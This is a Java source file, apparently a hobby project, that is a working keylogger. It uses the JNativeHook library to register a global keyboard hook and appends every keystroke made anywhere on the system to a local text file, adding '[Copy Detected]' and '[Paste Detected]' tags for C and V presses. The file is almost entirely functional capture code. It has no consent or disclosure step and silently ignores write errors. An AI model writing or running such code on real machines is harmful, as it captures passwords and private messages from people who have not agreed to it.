package javaapplication1;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.io.FileWriter;
import java.io.IOException;


public class JavaApplication1 implements NativeKeyListener {

public static void main(String[] args) throws NativeHookException {
        GlobalScreen.registerNativeHook();
       GlobalScreen.addNativeKeyListener(new JavaApplication1());
    } 
    
    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        switch (nke.getKeyCode()) {
            case NativeKeyEvent.VC_SPACE:
            {
                try {
                    FileWriter file=new FileWriter("src//JavaApplication1//file.txt",true);
                    file.write(" ");
                    file.close();
                } catch (IOException ex) {
                 
                }
            }
            break;

            case NativeKeyEvent.VC_ENTER:
               try {
                    FileWriter file=new FileWriter("src//JavaApplication1//file.txt",true);
                    file.write("\n");
                     file.close();
                } catch (IOException ex) {
                 
                }
                break;
                case NativeKeyEvent.VC_C:
            {
                try {
                    FileWriter file=new FileWriter("src//JavaApplication1//file.txt",true);
                    file.write("[Copy Detected]");
                    file.close();
                } catch (IOException ex) {
                 
                }
            }
            break;
            
                case NativeKeyEvent.VC_V:
            {
                try {
                    FileWriter file=new FileWriter("src//JavaApplication1//file.txt",true);
                    file.write("[Paste Detected]");
                    file.close();
                } catch (IOException ex) {
                 
                }
            }
                break;
                
            default:
                try {
                    FileWriter file=new FileWriter("src//JavaApplication1//file.txt",true);
                    file.write(NativeKeyEvent.getKeyText(nke.getKeyCode()));
                     file.close();
                } catch (IOException ex) {
                 
                }
           
            break;
        }
}
    @Override
    
    public void nativeKeyTyped(NativeKeyEvent nke){
        System.out.println("Pressed"+ NativeKeyEvent.getKeyText(nke.getKeyCode()));
    }   
    @Override
    public void nativeKeyReleased(NativeKeyEvent nke){
}
}
   